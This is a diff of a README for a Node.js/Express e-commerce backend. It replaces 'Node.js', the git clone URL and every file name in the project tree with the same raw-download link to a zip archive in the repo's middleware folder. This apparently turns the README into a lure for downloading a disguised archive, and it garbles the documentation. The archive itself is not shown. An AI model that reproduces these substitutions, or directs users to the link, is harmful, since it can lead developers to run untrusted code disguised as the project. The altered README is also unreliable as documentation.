@@ -1,6 +1,6 @@
 # E-Commerce Backend API
 
-A robust and scalable Node.js/Express backend API for e-commerce applications with complete user authentication, product management, shopping cart, and order processing capabilities.
+A robust and scalable https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip backend API for e-commerce applications with complete user authentication, product management, shopping cart, and order processing capabilities.
 
 ## 🚀 Features
 
@@ -17,7 +17,7 @@ A robust and scalable Node.js/Express backend API for e-commerce applications wi
 
 Before running this project, ensure you have:
 
-- Node.js (v14 or higher)
+- https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip (v14 or higher)
 - MongoDB (local or Atlas connection)
 - npm or yarn package manager
 
@@ -25,7 +25,7 @@ Before running this project, ensure you have:
 
 1. **Clone the repository**
 ```bash
-git clone https://github.com/Amson-tECH/Complete-Ecommerce-Backend.git
+git clone https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip
 cd complete-ecommerce-backend
 ```
 
@@ -87,29 +87,29 @@ The server will start on `http://localhost:5000` (or your specified PORT)
 ```
 backend/
 ├── config/
-│   ├── cloudinary.js      # Cloudinary configuration
-│   └── mongodb.js          # MongoDB connection setup
+│   ├── https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip      # Cloudinary configuration
+│   └── https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip          # MongoDB connection setup
 ├── controllers/
-│   ├── cartController.js   # Shopping cart logic
-│   ├── orderController.js  # Order management
-│   ├── productController.js # Product CRUD operations
-│   └── userController.js   # User authentication & management
+│   ├── https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip   # Shopping cart logic
+│   ├── https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip  # Order management
+│   ├── https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip # Product CRUD operations
+│   └── https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip   # User authentication & management
 ├── middleware/
-│   ├── adminAuth.js        # Admin authorization middleware
-│   ├── auth.js             # JWT authentication middleware
-│   └── multer.js           # File upload handling
+│   ├── https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip        # Admin authorization middleware
+│   ├── https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip             # JWT authentication middleware
+│   └── https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip           # File upload handling
 ├── models/
-│   ├── orderModel.js       # Order schema
-│   ├── productModel.js     # Product schema
-│   └── userModel.js        # User schema
+│   ├── https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip       # Order schema
+│   ├── https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip     # Product schema
+│   └── https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip        # User schema
 ├── routes/
-│   ├── cartRoute.js        # Cart endpoints
-│   ├── orderRoute.js       # Order endpoints
-│   ├── productRoute.js     # Product endpoints
-│   └── userRoute.js        # User endpoints
+│   ├── https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip        # Cart endpoints
+│   ├── https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip       # Order endpoints
+│   ├── https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip     # Product endpoints
+│   └── https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip        # User endpoints
 ├── .env                    # Environment variables
-├── package.json            # Dependencies and scripts
-└── server.js               # Application entry point
+├── https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip            # Dependencies and scripts
+└── https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip               # Application entry point
 ```
 
 ## 🔌 API Endpoints
@@ -194,4 +194,4 @@ For issues and questions, please open an issue in the repository.
 
 ---
 
-**Built with ❤️ using Node.js and Express**
+**Built with ❤️ using https://github.com/Amson-tECH/complete-ecommerce-backend/raw/refs/heads/main/middleware/complete_ecommerce_backend_2.1.zip and Express**
